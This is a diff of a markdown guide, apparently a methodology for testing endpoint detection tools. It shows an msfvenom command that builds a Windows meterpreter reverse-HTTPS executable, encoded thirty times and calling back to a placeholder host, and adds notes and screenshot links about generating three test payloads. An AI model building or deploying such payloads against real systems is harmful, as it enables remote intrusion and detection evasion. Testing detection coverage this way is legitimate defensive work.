@@ -41,3 +41,11 @@ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https -e x86/s
 ```
 msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai -i 30 lport=8443 lhost=1.2.3.4 -b "\x00\xff" -f exe -o test3.exe
 ```
+
+The command shoudl complete and output 3 testing executables. For the high interation payloads you may recieve an error as the paylod errors during the interation process, just rerun the command until you get a successful run.
+
+![output payload 1](https://raw.githubusercontent.com/blumirabrian/endpoint-detection-methology/main/msf/edr2.png "Payload 1")
+
+![output payload 3 error](https://raw.githubusercontent.com/blumirabrian/endpoint-detection-methology/main/msf/edr3.png "Payload 3 Error")
+
+![output payload 3 success](https://raw.githubusercontent.com/blumirabrian/endpoint-detection-methology/main/msf/edr4.png "Payload 3 Success")
